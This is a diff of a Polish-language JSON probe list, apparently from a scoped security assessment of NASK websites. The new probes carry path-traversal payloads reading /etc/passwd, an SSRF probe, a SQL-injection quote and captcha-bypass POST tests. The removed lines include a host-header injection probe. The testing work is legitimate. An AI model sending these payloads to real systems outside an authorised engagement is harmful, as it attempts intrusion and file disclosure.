@@ -1,152 +1,193 @@
 {
-  "_opis": "Runda 7: sondy wynikajace z przegladu 6 galezi zespolu (Pokemon c87/7911/a450, Gemma 6d08, Smak 5ed7). Nowe: /download-file na bezpiecznymiesiac (endpoint spoza naszej mapy), weryfikacja twierdzenia o /admin/logs w HIVE, stabilnosc cookieHash na 116sos (host wrocil), drafty Nuxt Content. Kazda sonda jest teraz odejmowana od catch-all hostu, a 308 jest rozstrzygane jednym skokiem same-origin.",
-  "_zasady": "GET-only, 2 req/s, bez cial i bez logowania. Skok przekierowania tylko na ten sam host i tylko https.",
+  "_opis": "Runda 8: dwie nowe powierzchnie wynikajace z mapy tras w reports/analysis-run003.json (129 bundli JS zespolu, przeczytane offline). (A) 116sos.pl /api/og-image?imageId= — jedyny endpoint, ktory w kodzie klienckim jest wolany z REALNYMI identyfikatorami (18650, 30225, 30263, 30267, 30278); jesli serwer sklada z tej wartosci sciezke do pliku albo URL do WordPressa, to jest tu LFI albo SSRF z odczytem (klasa 15 / 5). (B) dns.pl /api/who-is-xml i /api/domain-browser sa POST-only (GET = 404 Drupala, zmierzone w rundzie 8); obie sa ODCZYTOWE (whois, dostepnosc domeny) — pytanie brzmi, czy serwer egzekwuje captcha i jak traktuje pole name/domain. (C) parametry trzech potwierdzonych tras JSON dns.pl (kontrola zakresu paginacji) i (D) parametr query w science.nask.pl /api/search (sygnal SQLi, klasa 4).",
+  "_zasady": "GET wszędzie, z JEDNYM wyjątkiem: POST na dns.pl /api/who-is-xml/* i /api/domain-browser/* — oba są zapytaniami ODCZYTOWYMI (whois, sprawdzenie dostępności domeny), nie tworzą stanu. Guard POST jest w kodzie (post_allowed), nie w komentarzach. Tempo 2 req/s, bez logowania, bez podążania za przekierowaniami poza zakres. Każda sonda jest odejmowana od catch-all hostu.",
   "checks": [
     {
-      "id": "s7-bm-dl-control",
-      "host": "bezpiecznymiesiac.pl",
+      "id": "s8-116-og-known-18650",
+      "host": "116sos.pl",
       "method": "GET",
-      "path": "/download-file/?fileUrl=/media/2026/09/Facebook-ecsm-1.png",
-      "why": "Kontrola: istniejacy plik z /media/. Czy endpoint serwuje cokolwiek (200) czy tylko PDF-y (500)?",
+      "path": "/api/og-image?imageId=18650",
+      "why": "Kontrola pozytywna: ID wystepuje w kodzie klienckim trzy razy (og-image dla udostepnianej strony). Czy endpoint w ogole zwraca obraz?",
       "class": "info"
     },
     {
-      "id": "s7-bm-dl-encslashes",
-      "host": "bezpiecznymiesiac.pl",
+      "id": "s8-116-og-known-30225",
+      "host": "116sos.pl",
       "method": "GET",
-      "path": "/download-file/?fileUrl=%2Fmedia%2F2026%2F09%2FFacebook-ecsm-1.png",
-      "why": "Ten sam plik, ale ze zakodowanymi ukosnikami — czy filtr dekoduje przed walidacja (rozna odpowiedz = inna sciezka kodu).",
-      "class": "15"
-    },
-    {
-      "id": "s7-bm-dl-dot",
-      "host": "bezpiecznymiesiac.pl",
-      "method": "GET",
-      "path": "/download-file/?fileUrl=/media/./2026/09/Facebook-ecsm-1.png",
-      "why": "Segment '.' w srodku: normalizacja po walidacji to klasyczny bypass prefiksu /media/ (poz. 15).",
-      "class": "15"
-    },
-    {
-      "id": "s7-bm-dl-case",
-      "host": "bezpiecznymiesiac.pl",
-      "method": "GET",
-      "path": "/download-file/?fileUrl=/MEDIA/2026/09/Facebook-ecsm-1.png",
-      "why": "Wielkosc liter w prefiksie: czy walidacja prefiksu jest case-sensitive, a system plikow nie.",
-      "class": "15"
-    },
-    {
-      "id": "s7-bm-dl-noslash",
-      "host": "bezpiecznymiesiac.pl",
-      "method": "GET",
-      "path": "/download-file/?fileUrl=media/2026/09/Facebook-ecsm-1.png",
-      "why": "Prefiks bez wiodacego ukosnika — ujawnia, czy sciezka jest doklejana do katalogu bazowego.",
+      "path": "/api/og-image?imageId=30225",
+      "why": "Druga kontrola pozytywna z innej grupy ID (30225/30263/30267/30278). Dwa rozne obrazy = endpoint dziala i jest parametryzowany.",
       "class": "info"
     },
     {
-      "id": "s7-bm-dl-dir",
-      "host": "bezpiecznymiesiac.pl",
+      "id": "s8-116-og-miss-9",
+      "host": "116sos.pl",
       "method": "GET",
-      "path": "/download-file/?fileUrl=/media/2026/09/",
-      "why": "Katalog zamiast pliku: 500 vs 404 rozroznia 'nie ma pliku' od 'blad obslugi' (sygnal o implementacji).",
+      "path": "/api/og-image?imageId=9",
+      "why": "Kontrola negatywna: niskie ID prawie na pewno nie istnieje. Bez niej kazda odpowiedz 500 jest nieodrozinalna od bledu dla poprawnego ID.",
       "class": "info"
     },
     {
-      "id": "s7-116-hash-a",
+      "id": "s8-116-og-alpha",
       "host": "116sos.pl",
       "method": "GET",
-      "path": "/api/fetch-cookie-hash",
-      "why": "Stabilnosc cookieHash: pierwszy odczyt w przebiegu.",
-      "class": "11.1"
+      "path": "/api/og-image?imageId=abc",
+      "why": "Kontrola typu: wartosc nieliczbowa. Rozny status/rozmiar niz 'miss' = serwer nie rzutuje na int, czyli wartosc moze trafic do sciezki lub URL.",
+      "class": "info"
     },
     {
-      "id": "s7-116-hash-b",
+      "id": "s8-116-og-dotdot",
       "host": "116sos.pl",
       "method": "GET",
-      "path": "/api/fetch-cookie-hash",
-      "why": "Drugi odczyt: identyczna wartosc = stala (cache-buster), inna = pochodna sesji (do analizy).",
-      "class": "11.1"
+      "path": "/api/og-image?imageId=../../../../etc/passwd",
+      "why": "Path traversal w parametrze, ktory najpewniej sluzy do zlozenia sciezki pliku (klasa 15). Warunek odrzucenia: odpowiedz identyczna jak 'alpha'/'miss' (czyli parametr jest rzutowany na int przed uzyciem).",
+      "class": "15"
     },
     {
-      "id": "s7-116-hash-xfh",
+      "id": "s8-116-og-dotdot-enc",
       "host": "116sos.pl",
       "method": "GET",
-      "path": "/api/fetch-cookie-hash",
-      "why": "X-Forwarded-Host: czy odpowiedz zalezy od naglowka hosta (cache poisoning / host header injection, poz. 18).",
-      "class": "18",
+      "path": "/api/og-image?imageId=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+      "why": "Ten sam traversal, zakodowany — czesc filtrÃ³w normalizuje przed dekodowaniem, a czesc po. Rozna odpowiedz niz poprzednia sonda = dekodowanie po walidacji.",
+      "class": "15"
+    },
+    {
+      "id": "s8-116-og-abs",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/og-image?imageId=/etc/passwd",
+      "why": "Sciezka absolutna zamiast wzglednej: jesli parametr jest doklejany do katalogu, wynik bedzie inny niz przy traversal.",
+      "class": "15"
+    },
+    {
+      "id": "s8-116-og-relative-media",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/og-image?imageId=wp-content/uploads/sites/4/2025/01/Designer-11.png",
+      "why": "Sciezka wzgledna do istniejacego, publicznego pliku WordPressa (ta sama, ktora serwuje science.nask.pl/api/media). 200 = parametr steruje sciezka => traversal wyzej ma znaczenie.",
+      "class": "15"
+    },
+    {
+      "id": "s8-116-og-url",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/og-image?imageId=https://example.com/x.png",
+      "why": "Jesli wartosc trafia do fetcha po stronie serwera (a nie do readFile), to jest tu SSRF. Warunek odrzucenia: identyczna odpowiedz jak kontrolki (parametr nie jest URL-em).",
+      "class": "5"
+    },
+    {
+      "id": "s8-dns-whois-json",
+      "host": "dns.pl",
+      "method": "POST",
+      "path": "/api/who-is-xml/pl",
+      "body": "{\"name\":\"nask.pl\"}",
+      "json": true,
+      "why": "ODCZYT (whois). Czy endpoint przyjmuje cialo JSON bez tokenu captcha? 200 z XML = captcha nieegzekwowana po stronie serwera (samo w sobie nieplaten klasa, ale otwiera test pola name).",
+      "class": "info"
+    },
+    {
+      "id": "s8-dns-whois-captcha-empty",
+      "host": "dns.pl",
+      "method": "POST",
+      "path": "/api/who-is-xml/pl",
+      "body": "{\"name\":\"nask.pl\",\"captcha\":\"\"}",
+      "json": true,
+      "why": "To samo z pustym polem captcha — zgodnie z kontraktem z bundla (name + captcha). Roznica wobec poprzedniej sondy pokazuje, czy pole jest w ogole czytane.",
+      "class": "info"
+    },
+    {
+      "id": "s8-dns-whois-captcha-junk",
+      "host": "dns.pl",
+      "method": "POST",
+      "path": "/api/who-is-xml/pl",
+      "body": "{\"name\":\"nask.pl\",\"captcha\":\"naskhunt-test\"}",
+      "json": true,
+      "why": "Kontrola egzekwowania captchy: niepoprawny token. Jesli ta sonda i 'captcha-empty' daja TEN SAM wynik co 'whois-json', pole jest ignorowane.",
+      "class": "info"
+    },
+    {
+      "id": "s8-dns-browser-json",
+      "host": "dns.pl",
+      "method": "POST",
+      "path": "/api/domain-browser/pl",
+      "body": "{\"domain\":\"nask.pl\"}",
+      "json": true,
+      "why": "ODCZYT (dostepnosc domeny). Czy dziala bez recaptcha? Ta trasa jest ciekawsza od whois, bo odpowiada na pytanie 'czy domena jest wolna' — czyli siega do rejestru.",
+      "class": "info"
+    },
+    {
+      "id": "s8-dns-browser-form",
+      "host": "dns.pl",
+      "method": "POST",
+      "path": "/api/domain-browser/pl",
+      "body": "domain=nask.pl",
       "headers": {
-        "X-Forwarded-Host": "arena-probe.example"
-      }
-    },
-    {
-      "id": "s7-116-centres-all",
-      "host": "116sos.pl",
-      "method": "GET",
-      "path": "/api/centres-search?q=zzzzqqqxxx",
-      "why": "Kontrola: q ignorowane -> API zwraca cala baze osrodkow niezaleznie od frazy. Publiczne, ale mierzy over-read.",
-      "class": "12.2"
-    },
-    {
-      "id": "s7-116-centres-id",
-      "host": "116sos.pl",
-      "method": "GET",
-      "path": "/api/centres-search?q=a&id=1",
-      "why": "Czy istnieje filtr po id (ujawni endpoint szczegolowy do dalszej analizy).",
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "why": "Ten sam odczyt, ale jako formularz — Vue potrafi wyslac oba warianty. Rozny wynik = rozny parser po stronie serwera (sygnal o implementacji).",
       "class": "info"
     },
     {
-      "id": "s7-hive-admin-logs",
-      "host": "dataannotation.pllum.org.pl",
+      "id": "s8-dns-list-size-999",
+      "host": "dns.pl",
       "method": "GET",
-      "path": "/admin/logs",
-      "why": "Cudza galaz twierdzi, ze /admin/logs ma 'guardy tylko klienta'. Mierze: redirect na /login = guard serwerowy, 200 z HTML = guard kliencki.",
-      "class": "9.1"
-    },
-    {
-      "id": "s7-hive-api-admin-logs",
-      "host": "dataannotation.pllum.org.pl",
-      "method": "GET",
-      "path": "/api/v1/admin/logs",
-      "why": "Ten sam zasob po API: 401 = autoryzacja po stronie serwera.",
-      "class": "9.1"
-    },
-    {
-      "id": "s7-hive-api-users-slash",
-      "host": "dataannotation.pllum.org.pl",
-      "method": "GET",
-      "path": "/api/v1/users/",
-      "why": "Trailing slash: 307 -> 401 potwierdza zywa trase (kontrakt FastAPI).",
-      "class": "12.1"
-    },
-    {
-      "id": "s7-pllum-drafts",
-      "host": "pllum.org.pl",
-      "method": "GET",
-      "path": "/api/_content/query?_params=%7B%22where%22%3A%5B%5B%22_draft%22%2C%22%3D%22%2Ctrue%5D%5D%7D",
-      "why": "Nuxt Content z filtrem po _draft=true: pusty wynik = brak wycieku wersji roboczych; niepusty = dane niepubliczne (poz. 3).",
-      "class": "3"
-    },
-    {
-      "id": "s7-naskpl-search-literal",
-      "host": "nask.pl",
-      "method": "GET",
-      "path": "/api/search?query=raport&lang=pl",
-      "why": "API wyszukiwarki na literalnym hoscie z §5 (bez podazania na www — inny host, poza zakresem).",
+      "path": "/api/registrars-list/pl/999/1",
+      "why": "Kontrola paginacji: czy serwer respektuje dowolny rozmiar strony. Dane sa publiczne (rejestratorzy), wiec to nie jest wyciek — chodzi o to, czy parametr jest walidowany.",
       "class": "info"
     },
     {
-      "id": "s7-naskpl-root",
-      "host": "nask.pl",
+      "id": "s8-dns-list-page-0",
+      "host": "dns.pl",
       "method": "GET",
-      "path": "/",
-      "why": "Zapis Location dla nask.pl: dokumentuje, ze kanoniczny host to www (poza zakresem) i ze skoku NIE wykonujemy.",
+      "path": "/api/registrars-list/pl/20/0",
+      "why": "Strona 0: ujawnia, czy numer strony jest liczony od 0 czy 1 (i czy nie ma off-by-one w zapytaniu).",
       "class": "info"
     },
     {
-      "id": "s7-dyzurnet-api",
-      "host": "dyzurnet.pl",
+      "id": "s8-dns-funny-name",
+      "host": "dns.pl",
       "method": "GET",
-      "path": "/api",
-      "why": "Cudza galaz: /api zwraca 404 app-routera. Potwierdzam jednym zadaniem z catch-allem.",
+      "path": "/api/funny-name/pl",
+      "why": "Jedyna trasa dns.pl z bundla, ktorej nie zmierzylismy. GET bez parametrow — mapa, nie atak.",
+      "class": "info"
+    },
+    {
+      "id": "s8-dns-services",
+      "host": "dns.pl",
+      "method": "GET",
+      "path": "/api/registrars-services",
+      "why": "Trasa z bundla bez odpowiednika w naszej mapie. Slownik uslug rejestratorow — sprawdzamy, czy zwraca wiecej niz strona pokazuje.",
+      "class": "info"
+    },
+    {
+      "id": "s8-dns-stats",
+      "host": "dns.pl",
+      "method": "GET",
+      "path": "/api/stats/",
+      "why": "Trasa /api/stats/ (z bundla, inna niz /api/zone-stats). Jesli zwraca dane spoza publicznego wykresu — klasa 3; jesli tylko to samo — zamykamy.",
+      "class": "info"
+    },
+    {
+      "id": "s8-sci-q-quote",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/search?query=%27&lang=pl",
+      "why": "Sygnal SQLi (klasa 4): apostrof w parametrze, ktory trafia do WP_Query. Warunek odrzucenia: odpowiedz identycznej dlugosci i struktury jak 'sci-q-miss'.",
+      "class": "4"
+    },
+    {
+      "id": "s8-sci-q-miss",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/search?query=zzzqqqxx&lang=pl",
+      "why": "Kontrola negatywna dla poprzedniej sondy: ciag, ktorego nie ma w bazie. Bez tego pusta odpowiedz na apostrof nic nie znaczy.",
+      "class": "info"
+    },
+    {
+      "id": "s8-sci-q-empty",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/search?query=&lang=pl",
+      "why": "Kontrola pozytywna: puste zapytanie zwraca zbior domyslny — pokazuje, jak wyglada 'dziala'. Porownanie z apostrofem ma sens tylko wzgledem tego.",
       "class": "info"
     }
   ]
